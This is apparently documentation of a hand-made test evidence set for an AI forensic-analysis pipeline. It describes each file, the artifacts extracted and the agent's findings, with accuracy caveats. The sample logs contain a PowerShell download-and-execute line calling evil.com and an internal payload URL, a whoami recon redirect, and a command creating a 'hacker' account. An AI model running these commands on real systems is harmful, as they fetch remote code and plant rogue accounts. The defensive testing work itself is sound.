# Evidence Dataset

**Corpus path:** `evidence/`  
**Total files:** 4  
**Active (non-empty) files:** 2  
**Total bytes (active):** 256 bytes (51 + 205)

---

## File Index

| File | Size | SHA-256 | Status |
|------|------|---------|--------|
| `evidence/test.log` | 51 bytes | `d222a2f3…dfc719d` | Active |
| `evidence/windows_event.log` | 205 bytes | `4a1e3ef1…e2270` | Active |
| `evidence/evidence.zip` | 0 bytes | — | Empty |
| `evidence/ex2.pcap` | 0 bytes | — | Empty |

---

## evidence/test.log

### Content

```
powershell -enc suspicious_command http://evil.com
```

One line, no timestamp, no newline after. 51 bytes.

### Origin

Hand-crafted test input. Simulates a minimal one-liner that an attacker might paste into a shell or drop as a script stub. `suspicious_command` is a literal placeholder string, not an actual encoded payload — the `-enc` flag and `http://evil.com` domain are present but the argument that would normally follow `-enc` is not Base64-encoded content.

### Artifacts extracted by the pipeline

| Artifact type | Source | Trigger |
|---------------|--------|---------|
| `suspicious_execution` | `test.log:1` | `powershell` substring |
| `network_indicator` | `test.log:1` | `http://` substring |

`base64_payload` is **not** emitted: `suspicious_command` contains no sequence matching the `_B64_RE` pattern (minimum 32-character Base64 string).

### What the agent found

Across all runs the agent consistently produced two findings against this file:

1. **Suspicious process execution** — `powershell` confirmed present by both `strings` and `grep`. Verified `true` in every run.
2. **Network indicator / potential C2** — `http://evil.com` confirmed present by `grep 'https?://[^\s]+'`. Verified `true` in every run.

**Accuracy caveat:** The "C2 beaconing" characterisation overstates the evidence. `suspicious_command` is a placeholder, not an encoded payload, so no actual command was executed or transmitted. `evil.com` is a well-known test/placeholder domain, not confirmed adversary infrastructure.

---

## evidence/windows_event.log

### Content

```
2026-04-23 10:00:01 powershell.exe -encodedCommand aQBlAHgA http://192.168.1.100/payload.ps1
2026-04-23 10:00:05 cmd.exe /c whoami > C:\Users\temp\out.txt
2026-04-23 10:00:10 net user hacker P@ssw0rd /add
```

Three lines with `YYYY-MM-DD HH:MM:SS` timestamps. 205 bytes.

### Origin

Hand-crafted to represent a compressed Windows attack chain spanning 9 seconds:

| Time | Command | Technique |
|------|---------|-----------|
| 10:00:01 | `powershell.exe -encodedCommand aQBlAHgA http://192.168.1.100/payload.ps1` | Fileless execution via `-encodedCommand`; `aQBlAHgA` is UTF-16-LE Base64 for `iex` (Invoke-Expression) |
| 10:00:05 | `cmd.exe /c whoami > C:\Users\temp\out.txt` | Discovery/recon — captures current user identity and redirects to a temp file |
| 10:00:10 | `net user hacker P@ssw0rd /add` | Persistence — creates a local account named `hacker` |

The internal IP `192.168.1.100` places the payload server inside an RFC 1918 `192.168.0.0/16` range, consistent with an already-compromised internal host serving the next-stage payload rather than external attacker infrastructure.

### Artifacts extracted by the pipeline

| Artifact type | Source | Trigger |
|---------------|--------|---------|
| `suspicious_execution` | `windows_event.log:1` | `powershell` substring |
| `network_indicator` | `windows_event.log:1` | `http://` substring |
| `suspicious_execution` | `windows_event.log:2` | `cmd.exe` substring |
| `account_creation` | `windows_event.log:3` | `net user` substring |
| `suspicious_execution` | `windows_event.log:3` | `cmd.exe` in `net user hacker P@ssw0rd /add`? No — this does not match. *(see note below)* |

**Note on `suspicious_execution` count:** The `extract_artifacts` loop checks `"cmd.exe" in low or "powershell" in low` per line. Line 3 (`net user…`) triggers neither, so only 2 `suspicious_execution` artifacts come from this file. The third `suspicious_execution` seen in the 20:03 run log comes from `test.log:1`.

`base64_payload` is **not** emitted for `aQBlAHgA`: the string is 8 characters (2 Base64 groups of 4). The `_B64_RE` regex requires a minimum of 8 groups (32 characters), so short encoded arguments are not caught.

### What the agent found

In the most recent patched run (20:03 UTC), 6 hypotheses were generated and all 6 verified `true`:

| Hypothesis | Support | RFC 1918 flag | Notes |
|------------|---------|---------------|-------|
| Initial suspicious execution with network activity | `test.log:1` | — | Correct; `http://evil.com` confirmed |
| Network indicator suggesting outbound connection to attacker infrastructure | `test.log:1` | — | Partially accurate; `evil.com` is a placeholder domain |
| Suspicious process execution with network communication (payload retrieval / lateral movement) | `windows_event.log:1` | `ip_classification: internal IPs ['192.168.1.100'] — RFC 1918 — lateral movement / internal staging` | RFC 1918 correctly identified; claim text says "lateral movement" which matches |
| Network indicator pointing to C2 channel establishment | `windows_event.log:1` | `ip_classification: internal IPs ['192.168.1.100'] — RFC 1918 — lateral movement / internal staging` | IP correctly classified as internal, but claim text says "C2" — logged warning applied |
| Follow-up execution 4 seconds later — multi-stage attack / secondary payload | `windows_event.log:2` | — | Accurate; `cmd.exe /c whoami` is a recon step 4 s after line 1 |
| Account creation after suspicious executions — persistence via rogue user | `windows_event.log:3` | — | Accurate; `net user hacker P@ssw0rd /add` confirmed present |

**Timeline accuracy:** After the `normalize_timeline` fix, events from `windows_event.log` are sorted by their embedded timestamps (`10:00:01 → 10:00:05 → 10:00:10`). Events from `test.log` (no timestamp) are assigned the file's mtime (`2026-04-23 00:01 UTC`) and sort before the `windows_event.log` entries.

---

## evidence/evidence.zip

### Content

Empty — 0 bytes.

### Origin

Placeholder file. Likely intended to hold a compressed archive of additional evidence but was never populated.

### What the pipeline does

Ingested without error. `data.decode()` on an empty byte string returns `""`. `splitlines()` on `""` returns `[]`. No artifacts are extracted. No log warning is emitted for the 0-byte size (MA-4 from the accuracy report — not yet fixed).

---

## evidence/ex2.pcap

### Content

Empty — 0 bytes.

### Origin

Placeholder file. The `.pcap` extension suggests a planned network capture, but no capture data is present.

### What the pipeline does

Same as `evidence.zip` — ingested silently, zero artifacts extracted. `file(1)` would normally identify a real pcap by its magic bytes (`d4 c3 b2 a1` or `0a 0d 0d 0a`); the 0-byte file has no magic and produces no `file` output. No log warning is emitted for the 0-byte size (MA-4 — not yet fixed).
